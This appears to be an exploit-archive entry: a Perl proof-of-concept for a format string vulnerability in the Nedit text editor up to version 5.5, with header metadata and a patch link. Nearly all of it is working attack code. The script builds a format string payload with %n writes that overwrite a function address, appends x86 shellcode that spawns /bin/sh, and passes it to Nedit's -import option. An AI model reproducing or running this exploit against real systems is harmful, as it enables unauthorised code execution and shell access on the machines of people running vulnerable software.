# Exploit Title: Format string vulnerability in Nedit <= 5.5.
# Date: 04/13/2011
# Author: Tosh (The bug was already patched when I'd found the vuln)
# Email: tosh@tuxfamily.org
# Patch:
http://nedit.cvs.sourceforge.net/viewvc/nedit/nedit/source/preferences.c?r1=1.159&r2=1.160&view=patch
# Version: Nedit 5.5
# Tested on: FreeBSD 8.2-RELEASE
# CVE: don't found


#!/usr/bin/perl -w

use strict;

my $exit_addr = 0x0815a86c;

my $sc =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50".
         "\x54\x53\xb0\x3b\x50\xcd\x80";

my (@payload) = ("./nedit", "-import", 
pack('L',$exit_addr).pack('L',$exit_addr+1).pack('L',$exit_addr+2).pack('L',$exit_addr+3).
  
"%1021\$.8x-"."%1\$127x%1021\$n%1\$083x%1022\$n%1\$212x%1023\$n%1\$256x%1024\$n"
. $sc);

exec(@payload);